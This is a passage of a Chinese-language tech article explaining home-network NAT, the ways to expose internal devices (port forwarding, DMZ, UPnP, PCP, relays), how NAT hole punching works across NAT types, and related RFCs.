协议。而且自己的设备一般是做为客户端，主动连接第三方服务器的。所以，在日常上网的情况下，我们一般不会感受到 NAT 的存在。</p>\n<h2>NAT 为我们带来了哪些不便之处</h2>\n<p>NAT 缓解了 IP 地址资源不足的问题，同时能使家庭中的多个设备共享同一条宽带，同时上网。另外，启用 NAT 后，外部设备无法主动发起对内网设备的连接，相当于起到了防火墙的作用，保护了内网设备，一定程度上提高了安全性。</p>\n<p>NAT 通过「巧妙」的方式，在内部地址和外部地址之间进行转换。大部分情况下，我们感受不到 NAT 的存在。但仍有部分应用，需要内网设备做为服务器，被外部连接，例如：</p>\n<ul>\n<li>远程访问家中的 NAS、监控摄像头</li>\n<li>eMule、BitTorrent 等 P2P 文件分享应用，使自己的设备可供外部连接，从而能够连接到更多分享者，获取更快的下载、上传速度</li>\n<li>部分语音通话、视频会议应用，通信双方直接连接，获取更好的通话质量</li>\n<li>部分联机游戏，不会经过第三方服务器，需要玩家之间直接建立连接</li>\n</ul>\n<p>对于这些应用，如果设备位于 NAT 之内，没有公网 IP，就难以实现了。</p>\n<h2>如何在 NAT 场景下，使内网设备可被连接</h2>\n<p>那么，在 NAT 环境下，应该如何让内网设备做为服务器，使内网设备被外部连接？下文将介绍几种常见的方式。</p>\n<h3>多拨</h3>\n<p>部分运营商，支持在多个设备上，通过 PPPoE 登录同一个宽带账号。每个设备都能获取到一个独立的公网 IP<sup class=\"ss-footnote\" href=\"\" title=\"具体可以阅读宽带用户协议，或实际尝试，来确定运营商是否支持。\" footnote-id=\"4\">4</sup>。</p>\n<p>如果想让游戏主机等设备获取独立的公网 IP，供外部连接，可以在光猫之后连接交换机。游戏主机连接交换机，直接进行 PPPoE 拨号。无线路由器也连接交换机，家中的其他网络设备经过无线路由器访问 Internet。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/980594b3b7d51571fd636e97dfd08c44.png\"></figure><p>但是多拨的局限也很大：</p>\n<ul>\n<li>仅部分运营商支持多拨</li>\n<li>一些运营商已不再为用户分配公网 IP，即使通过多拨，也获取不到公网 IP</li>\n<li>越来越多的设备不再支持 PPPoE。例如 Xbox 360 支持 PPPoE，<a href=\"https://support.xbox.com/zh-cn/help/hardware-network/connect-network/connect-live-using-pc\">但 Xbox One 之后的版本已不再支持</a>\n</li>\n<li>设备直接获取公网 IP，暴露在公网上，安全性较差。可能需要单独设置防火墙</li>\n<li>需要额外购买交换机，连接在光猫和路由器之间。会改变家庭网络拓扑，操作比较复杂</li>\n</ul>\n<p>所以，这种方式不太常用。</p>\n<h3>端口转发、DMZ</h3>\n<p>上文中介绍的 NAT，路由器会根据内网设备发出的报文，自动形成 NAT 表项。实际上，用户还可以在路由器上手动配置端口映射关系，让内网设备可被外部访问。</p>\n<p>其中，<strong>DMZ</strong> 功能，可以指定一台内网设备为 DMZ 主机。到达路由器上的报文，如果没有匹配 NAT 表项，就会转发到 DMZ 主机。从而使 DMZ 主机可被外部访问。</p>\n<ul><li><a href=\"https://www.asus.com.cn/support/FAQ/1011722/\">DMZ的介绍与设定 | 官方支持 | ASUS 中国</a></li></ul>\n<p>DMZ 功能能让一台内网设备上的所有端口，都能被公网访问。但这样做也影响了内网设备的安全性，如果没有特殊需要，不建议打开这一功能。</p>\n<p>而 <strong>端口转发</strong> 功能，可以手动设置端口映射关系，让指定内网设备的指定端口，能够被公网访问：</p>\n<ul><li><a href=\"https://www.asus.com.cn/support/FAQ/1037906\">如何在ASUS路由器设置端口转发规则？ | 官方支持 | ASUS 中国</a></li></ul>\n<p>这种方式能够精确控制哪些设备的哪些端口可被公网访问。但需要用户具有一定的网络知识，知道需要被公网访问的应用的端口号，才能正确设置。</p>\n<p>另外批评一下任天堂，在官网的帮助文档中，直接让用户打开了所有 UDP 端口的端口转发。这样做降低了安全性，而且可能与用户的其他端口转发规则冲突。不过从另一个方面，也说明了根据实际应用，手动设置端口转发规则，对部分用户来说，确实是一件门槛较高的事情：</p>\n<ul><li><a href=\"https://twitter.com/J0hnnyXm4s/status/1379858444837064711\">ʝօɦռռʏ Ӽʍǟֆ on Twitter: \"Uhhh why is @NintendoAmerica telling every Switch owner to effectively expose their consoles directly to the internet? Real excited for how fat-fingering the IP and forgetting / not being able to set UDP only can also expose anything else on folks’ home networks. https://t.co/R5tSkbatfx\" / Twitter</a></li></ul>\n<h3>UPnP IGD、NAT-PMP</h3>\n<p>上文中的<strong>端口转发</strong>功能，需要手动配置端口转发规则，操作起来比较麻烦。而 UPnP IGD 和 NAT-PMP 协议，则能实现自动配置端口转发规则。</p>\n<p>UPnP IGD（互联网网关设备协议）和 NAT-PMP（NAT 端口映射协议）分别由微软和 Apple 提出，功能类似，都可以让应用程序告诉路由器需要打开的端口，让路由器自动设置端口转发规则。</p>\n<ul>\n<li><a href=\"https://zh.wikipedia.org/wiki/%E4%BA%92%E8%81%94%E7%BD%91%E7%BD%91%E5%85%B3%E8%AE%BE%E5%A4%87%E5%8D%8F%E8%AE%AE\">互联网网关设备协议 - 维基百科，自由的百科全书</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/NAT%E7%AB%AF%E5%8F%A3%E6%98%A0%E5%B0%84%E5%8D%8F%E8%AE%AE\">NAT端口映射协议 - 维基百科，自由的百科全书</a></li>\n</ul>\n<p>UPnP IGD 和 NAT-PMP 的工作，需要应用程序和路由器的配合。首先需要在路由器上打开 UPnP 或 NAT-PMP 功能：</p>\n<ul>\n<li><a href=\"https://service.tp-link.com.cn/detail_article_2936.html\">如何设置无线路由器的UPNP功能？ - TP-LINK 服务支持</a></li>\n<li><a href=\"https://openwrt.org/docs/guide-user/firewall/upnp/upnp_setup\">Universal Plug'n'Play and NAT-PMP on OpenWrt</a></li>\n</ul>\n<p>还需要使用支持的应用程序。目前 eMule、BitTorrent 等常见的 P2P 文件共享工具，以及 Synology DiskStation 等 NAS 设备，以及 Xbox 等游戏主机，都已经支持相关协议：</p>\n<ul>\n<li><a href=\"https://www.emule-project.net/home/perl/help.cgi?l=1&amp;topic_id=122&amp;rm=show_topic\">eMule UPnP 设置</a></li>\n<li><a href=\"https://trac.transmissionbt.com/wiki/PortForwardingGuide#NAT-PMPUPnP\">PortForwardingGuide – Transmission</a></li>\n<li><a href=\"https://kb.synology.cn/zh-cn/DSM/help/DSM/AdminCenter/connection_routerconf?version=6\">路由器配置 | DSM - Synology 知识中心</a></li>\n</ul>\n<h3>光猫改为桥接模式，使用路由器拨号</h3>\n<p>安装宽带时，运营商附送的光猫，一般会默认打开路由功能。这时光猫同时能作为路由器使用。</p>\n<p>但光猫的功能和性能有限，一部分型号的光猫不支持 UPnP IGD 等协议，或者不能手动配置端口转发规则。</p>\n<p>所以，可以考虑将光猫修改为桥接模式，通过自己的无线路由器拨号，充分利用路由器上端口转发、UPnP IGD、DMZ 等功能。</p>\n<p>正常情况下，光猫改桥接，最简单的方式是拨打运营商的电脑，让运营商远程下发配置。也可以登录光猫的管理页面，自行进行修改，具体需要上网搜索运营商名和光猫型号来查找教程。</p>\n<h3>向运营商申请获取公网 IP</h3>\n<p>由于 IPv4 地址资源不足，不少运营商已经不再分配公网 IP。</p>\n<p>在部分地区，可以尝试拨打运营商客服电话，申请分配公网 IP。</p>\n<p>另外一部分地区的运营商，在进行 PPPoE 拨号时，用户名中加入 <code>pub</code>，即可获取公网 IP：</p>\n<ul><li><a href=\"https://v2ex.com/t/651594\">广东电信真方便，用户名加个 pub. 就能拿到公网 IP 了。 - V2EX</a></li></ul>\n<p>部分地区需要付费购买，例如北京移动宽带，之前提供有公网 IP 叠加包。</p>\n<p>但是，由于 IPv4 地址资源本身已经不足，不一定能够成功申请到公网 IP。另外，拥有公网 IP，家中的路由器能直接被公网访问，如果没有配置好，可能会带来更多安全问题。所以，需要根据自己的实际需要，来决定是否申请公网 IP。</p>\n<h3>PCP</h3>\n<p>对于运行 NAT 的家庭路由器，通过 UPnP IGD 或 NAT-PMP 协议，可以方便地将端口映射到公网。</p>\n<p>但是，由于 IPv4 地址的不足，电信运营商也开始使用 NAT，不再为用户分配公网 IP。那么是否有一种类似 UPnP IGD 或者 NAT-PMP 的协议，运行在运营商的路由器上，能直接在运营商路由器上创建端口转发规则？</p>\n<p>PCP 就是这样一种协议：</p>\n<ul><li><a href=\"https://datatracker.ietf.org/doc/html/rfc6887\">Port Control Protocol (PCP) - RFC6887</a></li></ul>\n<p>该协议由 NAT-PMP 发展而来，运行在运营商的路由器上。用户的应用程序可通过 PCP 协议，申请在运营商路由器上打开端口。</p>\n<p>PCP 需要运营商的配合，选用支持的网络设备，并打开 PCP 功能，才能正常工作。根据 V2EX 网友的测试，国内已有运营商支持该协议，能通过 PCP 使 eMule 获得 High ID：</p>\n<ul><li><a href=\"https://v2ex.com/t/603512#r_7951805\">介绍一个可能有助于 CGN NAT 端口映射的工具 - V2EX</a></li></ul>\n<h3>服务器中转</h3>\n<p>上文中介绍了一系列使内网设备可被外部访问的方式。但这些方式或者需要用户手动配置，或者路由器的支持，或者需要运营商的支持…… 如果上述方式都不可用，就要通过第三方服务器中转的方式，让内网设备供外部访问。</p>\n<p>这种方式虽然需要第三方服务器的参与，浪费资源，但成功率最高，所以应用范围也很普遍。例如常见的游戏加速器，就可以通过第三方服务器中转的方式，为游戏主机提供更高的 NAT 类型：</p>\n<ul><li><a href=\"https://uu.163.com/box/\">网易UU加速盒</a></li></ul>\n<p>也有不少开源的反向代理工具，可以搭建在自己的服务器上，使内网服务可在公网访问：</p>\n<ul>\n<li><a href=\"https://github.com/fatedier/frp\">fatedier/frp</a></li>\n<li><a href=\"https://github.com/ehang-io/nps\">ehang-io/nps</a></li>\n</ul>\n<p>服务器中转需要额外的服务器，且需要消耗服务器上的流量。所以这种方式往往需要用户额外付费，例如购买游戏加速器会员，或者自行购买虚拟服务器，并在服务器上搭建反向代理应用。</p>\n<p>而对于微信语音、视频通话等应用，默认也会使用其他 NAT 穿透技术，来节省微信服务器的流量费用，降低成本。当其他 NAT 穿透方式不可用时，则采用服务器中转的方式，保证能够正常通话。</p>\n<h2>NAT 打洞</h2>\n<h3>NAT 打洞的工作过程</h3>\n<p>如果两台设备都位于 NAT 路由器之后，没有公网 IP。在没有第三方服务器的中转下，是不是就没有办法直接进行通信了？</p>\n<p>答案并不是这样的。NAT 打洞，就可以使两台内网设备能够直接通信，不需要第三方服务器的中转、不需要对路由器进行特殊设置、也不需要运营商的配置。<strong>微信语音、腾讯会议、Skype 通信等消耗流量较大的应用，都会利用 NAT 打洞实现内网设备间的直接通信。</strong></p>\n<p>这项技术听起来很神奇，但是原理并不复杂：</p>\n<p>我们以 PC 1、PC 2 两台主机的通信为例。两台主机均位于 NAT 路由器之后，各自的 IP 地址都是内网地址，无法互相通信：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/cc6a18d76818317d29d846c2cc5dbf23.png\"></figure><p>在两台主机能够直接通信之前，需要一台第三方服务器：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/4de565f3a92fe3acb91af82e71564759.png\"></figure><p>PC 1、PC 2 首先需要给服务器发送一个报文。经过 NAT 路由器后，报文的源 IP 和源端口号被转换，同时在路由器上形成 NAT 表项：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/b7a199c192770ef6ab44efc628d2d048.png\"></figure><p>报文到达服务器后，服务器记录下 PC 1、PC 2 两侧报文的源 IP 和源端口号，也就是 PC 1、PC 2 两侧的公网 IP 和外部端口号。然后，服务器将两台设备的公网 IP、外部端口号发送给对方。这样，PC 1、PC 2 都能相互知道对方的公网 IP 和外部端口号：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/79e7d6de07b4e0d1cdfff1f5c402e737.png\"></figure><p>其中一部分路由器的 NAT 检查比较宽松。一旦 NAT 表项建立，只要路由器上收到的报文，目的 IP 和目的端口号能够匹配到 NAT 表项，都会转发到表项对应的内网设备。对于这样的路由器，PC 1、PC 2 互相用对方的公网 IP 与外部端口号，就能直接通信了，不再需要第三方服务器：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/7de033b65f961fd57f624c04ab8f9384.png\"></figure><p>另一部分路由器的 NAT 检查比较严格，只有内网设备向指定的目的 IP、目的端口号发送过数据，来自这个 IP 和端口号的报文，才能转发到内网设备：</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/544bfdd016c237078f2100b5744a32b3.png\"></figure><p>对于这样的路由器，PC 1、PC 2 两台主机需要同时向对方的公网 IP 和外部端口号发送一个报文。这样，PC 1 侧的路由器认为 PC 1 向 PC 2 发送过数据；PC 2 侧的路由器认为 PC 2 向 PC 1 发送过数据，PC 1 和 PC 2 就能相互通信了。</p>\n<p>经历了上述步骤，NAT 打洞成功，两台设备就可以不依赖第三方路由器，直接进行通信。当然，上述过程只是一个简化的描述，不完全描述。如果想要进一步详细了解 NAT 打洞的过程，建议参考文末的 RFC 文档链接。</p>\n<p>可以看出，NAT 打洞可以在无需路由器特殊配置、无需运营商配合的情况下，实现两个内网设备的相互通信。另外，对于多层 NAT 的网络环境（例如运营商和家庭路由器各进行一级 NAT），NAT 打洞也能正常处理。</p>\n<h3>NAT 类型与打洞成功率</h3>\n<p>在一些路由器的设置页面或文档中，我们会看到，NAT 能设置成不同的类型，例如 Full cone、Restricted cone、Port-Restricted cone、Symmetric：</p>\n<ul><li><a href=\"https://www.asus.com.cn/support/FAQ/1045254/\">[无线路由器] 如何在华硕路由器中更改NAT类型? | 官方支持 | ASUS 中国</a></li></ul>\n<p>在 Xbox、PlayStation、Nintendo Switch 等游戏主机上，我们也能看到不同的 NAT 类型，例如 open、moderate、strict 等：</p>\n<ul>\n<li><a href=\"https://support.xbox.com/zh-CN/help/hardware-network/connect-network/xbox-one-nat-error\">解决 NAT 错误和多人游戏问题 | Xbox Support</a></li>\n<li><a href=\"https://manuals.playstation.net/document/cs/ps4/settings/nw%5C_test.html\">测试互联网连接 | PlayStation®4 用户指南</a></li>\n<li><a href=\"https://www.nintendoswitch.com.cn/support/faq/336.html\">无法与其他在线玩家连接 - Nintendo Switch 常见问题</a></li>\n</ul>\n<p>那么，这些 NAT 类型到底意味着什么？如何提升 NAT 类型，来获取更好的游戏体验？让我们先来了解一下基础的 NAT 类型：</p>\n<p><strong>完全圆锥形 NAT（Full cone NAT）：</strong></p>\n<p>对于完全圆锥形 NAT，内网 IP 和内网端口号，被映射为外部 IP 和外部端口号。当路由器收到来自外部的报文时，只要报文的目的 IP 和目的端口号，匹配到 NAT 表项的外部 IP 和外部端口号，都会转换为对应的内网 IP 和内网端口号，转发到内网设备。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/5e7c59a110e87dbcd840f5b182592275.png\"></figure><p>对于外部报文，路由器并不关心报文的源 IP 和源端口号（即报文来自谁），只要收到匹配 NAT 表项的报文，都能发送到内网设备。所以，完全圆锥形 NAT 是最宽松的 NAT，打洞最方便。</p>\n<p><strong>受限圆锥形 NAT（Restricted cone NAT）：</strong></p>\n<p>与完全圆锥形 NAT 相比，受限圆锥形 NAT，在内网设备向外发送报文时，路由器除了生成 NAT 表项，还会根据报文的目的 IP，记录下内网设备正在与哪些外部设备通信。</p>\n<p>这样，只有内网设备先发送报文给外部设备，外部设备回应的报文，才会被转发到内网设备。而其他外部设备发送过来的报文，即使匹配 NAT 表项，也无法发送到内网设备。</p>\n<p>这样的 NAT 安全性有一定的提高，但是也提高了打洞难度。两台内网设备需要互相给对方发送一个报文，才能打洞成功。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/2b3700d8b7edd01f06f0d6e3d0851a57.png\"></figure><p><strong>端口受限圆锥形 NAT（Port-Restricted cone NAT）：</strong></p>\n<p>端口受限圆锥形 NAT 和受限圆锥形 NAT 类似，但增加了检查的严格程度：<strong>受限圆锥形 NAT</strong>，只会外部设备的 IP 地址，来检查内网设备与哪些外部设备通信过。而<strong>端口受限圆锥形 NAT</strong>，会同时根据 IP 地址和端口号来进行检查。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/f7bb08586fa6a029aa5f2af1893acc08.png\"></figure><p><strong>对称 NAT（Symmetric NAT）：</strong></p>\n<p>前面的三种<strong>圆锥形 NAT</strong>，会根据内网设备发出去的报文的源 IP、源端口号两个信息建立 NAT 表项，将内网 IP 和内网端口号映射到外部 IP 和外部端口号。内网设备发出去的报文，无论目的 IP 和目的端口号如何变化，不管发给哪台外部设备，都会被映射为相同的外部 IP 和外部端口号。</p>\n<p>而<strong>对称 NAT</strong>，会同时根据内网设备出方向报文的源 IP、源端口号、目的 IP、目的端口号四个信息来建立 NAT 表项。如果报文的目的 IP、目的端口号发生了变化，映射到的外部端口号也会发生改变。</p>\n<p>对于对称 NAT，我们再来回顾一下前文中 NAT 打洞的过程。内网设备首先和第三方服务器通信，内网 IP 和内网端口号会被映射为一个外部 IP 和外部端口号。接下来，内网设备和另一台设备通信，相同的内网 IP 和内网端口号，又会被映射为另外一个外部端口号。这样，NAT 打洞就无法成功。</p>\n<p>所以，在对称 NAT 下，很难进行 NAT 打洞。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/31/5d7f369d6beba1c5cc54306d76c705ff.png\"></figure><p>而 Xbox、PlayStation、Nintendo Switch 上的 NAT 类型，基本上也跟上述四种 NAT 类型对应。例如 Xbox 上的三种 NAT 类型：</p>\n<ul>\n<li>\n<strong>open</strong>: 开放。当前主机可被所有外部主机连接。如果主机拥有公网 IP，或通过端口转发等方式，使主机可被外部访问，就能获取到这种类型。</li>\n<li>\n<strong>moderate</strong>: 当前主机无法被外部主机直接连接。但是可以通过 NAT 打洞等方式，实现主机间的通信。一般对应上文中的<strong>三种圆锥形 NAT</strong>。</li>\n<li>\n<strong>strict</strong>: 但是 NAT 比较严格，无法打洞成功。一般对应<strong>对称 NAT</strong>。</li>\n</ul>\n<p>PlayStation 的 NAT 类型也与之类似，可参考如下链接：</p>\n<ul><li><a href=\"https://bbs.a9vg.com/thread-5212551-1-2.html\">使PS4获得最佳NAT类型 更新华硕路由解决方案 - PS4/PS5综合讨论区 - A9VG电玩部落论坛</a></li></ul>\n<p>所以，对于能设置 NAT 类型的路由器（例如华硕的部分型号），将 NAT 类型设置为 Full cone NAT，能够更容易地实现 NAT 打洞，使游戏主机更容易被外部连接。</p>\n<h2>Q&amp;A</h2>\n<p>在这一章节，我会解答关于 NAT 的一些常见问题。如果还有其他疑问，欢迎在评论区提出，我会将相关问题与解答，更新到这一章节。</p>\n<h3>对于「对称 NAT」等更严格的 NAT，是否还可以打洞？</h3>\n<p>按照上文中的描述，「对称 NAT」是无法打洞成功的。但是，事实真的是这样吗？</p>\n<p>实际上，运用一点点概率知识，对称 NAT 也是可以打动成功的。让我们先来了解一下「生日问题」：</p>\n<blockquote><p>生日问题是指，如果在一个房间要多少人，则两个人的生日相同的概率要大于50%? 答案是23人。 这就意味着在一个典型的标准小学班级（30人）中，存在两人生日相同的可能性更高。对于60或者更多的人，这种概率要大于99%。 — <a href=\"https://zh.wikipedia.org/wiki/%E7%94%9F%E6%97%A5%E5%95%8F%E9%A1%8C\">Wikipedia</a></p></blockquote>\n<p>假设内网设备 A 位于「圆锥形 NAT」之后，内网设备 B 位于「对称 NAT」之后。这时候 A 向 B 发送报文，B 并不知道 A 的报文经过 NAT 之后，公网端口号会被转换为什么，所以无法向 A 发送数据。</p>\n<p>当然，在 B 不知道 A 的外部端口的情况下，也可以用不同的端口号，依次尝试向 A 发送报文，直到发送成功为止。但端口号一共有 65535 个，扫描所有端口并不现实…..</p>\n<p>那么，如果我们运用上「生日问题」，A 随机向 B 以不同的源端口号，发送 256 个报文，形成 256 个 NAT 表项；B 同时也随机以不同的目的端口号，向 A 发送 256 个报文进行探测，打洞成功率就能达到 64%。如果随机探测 1024 个端口，打洞成功率则能达到 98%。</p>\n<p>如果想要更详细地了解，可以参考这篇文章中 <i>The benefits of birthdays</i> 部分：</p>\n<ul><li><a href=\"https://tailscale.com/blog/how-nat-traversal-works/\">How NAT traversal works · Tailscale</a></li></ul>\n<p>果壳 DATAMUSE 团队制作了一个有趣的交互页面，来解释生日问题。如果感兴趣，不妨打开如下链接尝试一下：</p>\n<ul><li><a href=\"https://datamuse.guokr.com/web?page=bpp\">生日悖论 - DATAMUSE</a></li></ul>\n<h3>利用 NAT 打洞，能实现哪些有趣的应用</h3>\n<p>前文中已经提到，<strong>语音通话、视频会议应用</strong>，以及<strong>在线游戏</strong>，都用到了 NAT 打洞。那么，利用 NAT 打洞，还能实现哪些有趣的应用？</p>\n<p>其实，最常见的应用，就是通过 NAT 打洞，将多个设备组建一个虚拟局域网。例如在家中有 NAS，且没有公网 IP 的情况下，通过这些利用 NAT 打洞的工具，仍然可以在离开家的时候，用手机直接访问 NAS 上的文件。而且由于是直接通信，不会因为第三方服务器中转而降低传输速度。</p>\n<ul>\n<li><a href=\"https://www.zerotier.com/\">ZeroTier</a></li>\n<li><a href=\"https://tailscale.com/\">Tailscale</a></li>\n</ul>\n<p>另外，<a href=\"https://blanboom.org/2019/udm-1/\">UniFi Dream Machine</a> 等路由器，也通过 NAT 打洞等技术，使用户安全、方便地远程访问路由器。</p>\n<h3>TCP 也是一种比较常用的协议，为什么很少见到基于 TCP 的 NAT 打洞？</h3>\n<p>前面提到的 NAT 打洞，一般<strong>都是基于 UDP 协议</strong>的。但是，在 Internet 上，TCP 协议也十分常见。例如我们浏览网页、下载文件常用的 HTTP 协议，就是基于 TCP 的。</p>\n<p>那么，NAT 打洞时，为什么不常用 TCP 协议？</p>\n<p>这主要是因为，TCP 相对 UDP 复杂得多。UDP 协议是基于报文，一个一个报文收发的。而 TCP 需要先建立连接，然后才能传输数据。</p>\n<p>所以，应用程序可以方便地发送 UDP 报文，进行打洞。而对于 TCP，操作系统底层处理了连接建立、断开等过程。应用程序无法方便地控制单个报文的发送。</p>\n<p>另外，部分路由器的 NAT 实现，也会对 TCP 报文的状态进行额外检查。如果发送报文不属于某个连接，就会丢弃报文。</p>\n<p>所以，TCP 打洞理论上能实现，但实现复杂，且成功率不高。如果需要进行 TCP 打洞，建议改用 QUIC 协议。QUIC 协议虽然基于 UDP，但引入了与 TCP 类似的可靠传输、拥塞控制等机制。最新的 HTTP3 协议，就是基于 QUIC 的。</p>\n<ul><li><a href=\"https://www.chromium.org/quic\">QUIC, a multiplexed transport over UDP - The Chromium Projects</a></li></ul>\n<h3>NAT 打洞必定会成功吗</h3>\n<p>在网上，我们会常常看到关于「某个工具的 NAT 打洞成功率更高，而另一些工具经常打洞失败」的讨论。那么，如何理解这里说的「成功率」?</p>\n<p>NAT 打洞为内网设备之间的直接通信，提供了可能性。但是，不同厂商、不同设备的 NAT 实现，不是完全相同的。另外，两台内网设备之间，可能会经过多个路由器和防火墙，更增加了复杂性。</p>\n<p>所以，NAT 打洞无法保证完全成功。例如前文中介绍的对称 NAT，就无法保证 100% 成功。</p>\n<p>所以，一个比较好的 NAT 穿透实现，会进行多种尝试：例如先尝试 UPnP IGD 和 NAT- PMP，然后尝试不同的 NAT 打洞方案。在最终无法打洞成功时，选择服务器中转等备用方案。</p>\n<h3>NAT 打洞是否完美解决了 NAT 引入的问题？是否存在缺点？</h3>\n<p>NAT 打洞虽然能让内网设备直接通信，那么，是不是大部分设备，都不需要公网 IP，直接位于 NAT 之后就行了。</p>\n<p>其实不是这样，比起使用公网 IP 直接通信，NAT 打洞仍存在不少缺点，例如：</p>\n<ul>\n<li>NAT 打洞仍需第三方服务器的参与</li>\n<li>NAT 打洞无法 100% 成功，尤其是对称 NAT，更难打洞成功</li>\n<li>NAT 打洞的过程，需要开发者对应用程序进行适配</li>\n<li>为了节省资源，路由器上的 NAT 表项会超时删除。所以，NAT 打洞后，需要定期发送报文，维持路由器上的 NAT 表项。否则需要重新打洞</li>\n<li>NAT 打洞的操作本身，也增加了延迟</li>\n<li>NAT 打洞对 TCP 的支持不佳，一般使用 UDP。但不少运营商会对 UDP 进行限速，导致打洞后虽然设备间能直接通信，但无法以较快的速率传输</li>\n</ul>\n<h2>NAT 的未来</h2>\n<p>根据前面的介绍，我们看到，NAT 在缓解 IPv4 地址资源不足的问题上，做出了巨大的贡献；同时，NAT 的出现，也避免了个人设备暴露在公网，「意外地」提升了安全性。</p>\n<p>但是，NAT 带给我们更多的，是各种各样的限制...... 目前，IPv6 正在逐步普及，等我们彻底用上了 IPv6，NAT 可能就没有了存在的意义<sup class=\"ss-footnote\" href=\"\" title=\"NAT 也有一些其他用途，例如做为 IPv6 过渡技术，或者通过 IPv6 NAT 使 Docker 中的应用方便被外部访问。本文暂不讨论这些应用场景。\" footnote-id=\"5\">5</sup>。</p>\n<p>但是，为了保证安全性，家用路由器、PC、NAS 等设备上，一般都有防火墙功能。防火墙默认会阻止传入连接，除非用户手动配置防火墙，打开特定端口。所以，即使 NAT 被淘汰，类似 NAT 打洞的技术，在 IPv6 时代仍会得到应用。</p>\n<p>那么，当 IPv6 普及，NAT 消失，Internet 是否会诞生新的有趣的应用？家中的每个物联网设备都有了公网 IPv6 地址，是否会有一些新的玩法？是否会带来新的安全性问题？随着国内大幅度推进 IPv6 的建设，这些问题应该很快会有答案。</p>\n<h2>参考链接、延伸阅读</h2>\n<p>关于 NAT 的具体实现，可参考如下 RFC：</p>\n<ul>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc1631\">rfc1631</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc2663\">rfc2663</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc3022\">rfc3022</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc4787\">rfc4787</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc5382\">rfc5382</a></li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc5508\">rfc5508</a></li>\n</ul>\n<p>在 NAT 环境中进行 P2P 通信，会遇到哪些问题？应该如何解决？可参考如下 RFC：</p>\n<ul><li><a href=\"https://datatracker.ietf.org/doc/html/rfc5128\">rfc5128</a></li></ul>\n<p>已经有一系列协议，实现了完整的 NAT 打洞过程，可参考如下 RFC：</p>\n<ul>\n<li>\n<a href=\"https://datatracker.ietf.org/doc/html/rfc3489\">rfc3489</a>: STUN 协议。参考部分已有的 NAT 打洞技术，并将其标准化。</li>\n<li>\n<a href=\"https://datatracker.ietf.org/doc/html/rfc5389\">rfc5389</a>: 另一个 STUN 协议（与 RFC 3489 全称不同，但缩写相同）。支持 TCP 打洞。</li>\n<li>\n<a href=\"https://datatracker.ietf.org/doc/html/rfc5766\">rfc5766</a>: TURN 协议。可实现 NAT 打洞失败后，使用服务器中转。</li>\n<li>\n<a href=\"https://datatracker.ietf.org/doc/html/rfc5245\">rfc5245</a>: ICE 协议。更完整的协议，除了如何打洞，还描述了打洞成功后如何通信。</li>\n</ul>\n<p>这篇文章介绍了基于 NAT 穿透的虚拟局域网工具 Tailscale 的工作原理，可参考阅读：</p>\n<ul><li><a href=\"https://tailscale.com/blog/how-tailscale-works/\">How Tailscale works · Tailscale</a></li></ul>\n<p>在本文的写作过程中，还参考了如下文章。文章中有关于 NAT 的更多知识，如果对 NAT 感兴趣，可结合本文一起阅读：</p>\n<ul>\n<li><a href=\"https://tailscale.com/blog/how-nat-traversal-works/\">How NAT traversal works · Tailscale</a></li>\n<li><a href=\"https://evilpan.com/2015/10/31/p2p-over-middle-box/\">P2P通信原理与实现 - evilpan</a></li>\n<li><a href=\"https://evilpan.com/2015/12/12/p2p-standard-protocol-stun/\">P2P通信标准协议(一)之STUN - evilpan</a></li>\n<li><a href=\"https://evilpan.com/2015/12/15/p2p-standard-protocol-turn/\">P2P通信标准协议(二)之TURN - evilpan</a></li>\n<li><a href=\"https://evilpan.com/2015/12/20/p2p-standard-protocol-ice/\">P2P通信标准协议(三)之ICE - evilpan</a></li>\n<li><a href=\"https://zh.wikipedia.org/wiki/NAT%E7%A9%BF%E9%80%8F\">NAT穿透 - 维基百科，自由的百科全书</a></li>\n<li><a href=\"https://www.cnblogs.com/pannengzhi/p/4800526.html\">P2P通信原理与实现(C++) - 有价值炮灰 - 博客园</a></li>\n<li><a href=\"http://www.chenhe.cc/p/41\">NAT 科普与类型提升 – 晨鹤小站</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s/nQBRhfZuufPB72_jGDXQwg\">42张图详解 NAT : 换个马甲就能上网</a></li>\n</ul>\n<p>本文配图素材来自 <a href=\"https://www.flaticon.com/\">Flaticon</a>，作者包括 <a href=\"https://www.flaticon.com/authors/eucalyp\">Eucalyp</a>、<a href=\"https://www.freepik.com/\">Freepik</a>、<a href=\"https://www.flaticon.com/authors/icongeek26\">Icongeek26</a>、<a href=\"https://www.flaticon.com/authors/xnimrodx\">xnimrodx</a>、<a href=\"https://www.flaticon.com/authors/good-ware\">Good Ware</a>、<a href=\"https://www.flaticon.com/authors/srip\">srip</a>、<a href=\"https://www.flaticon.com/authors/phatplus\">phatplus</a>。</p>\n<p>题图来源：</p>\n<ul><li><a href=\"https://unsplash.com/photos/UrtxBX5i5SE\">rectangular gray corded device on black rack photo – Free Computer Image on Unsplash</a></li></ul>\n<p>对于家庭网络的更多内容，欢迎关注我在 GitHub 上创建的 Awesome List：</p>\n<ul><li><a href=\"https://github.com/blanboom/awesome-home-networking-cn\">blanboom/awesome-home-networking-cn</a></li></ul>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a 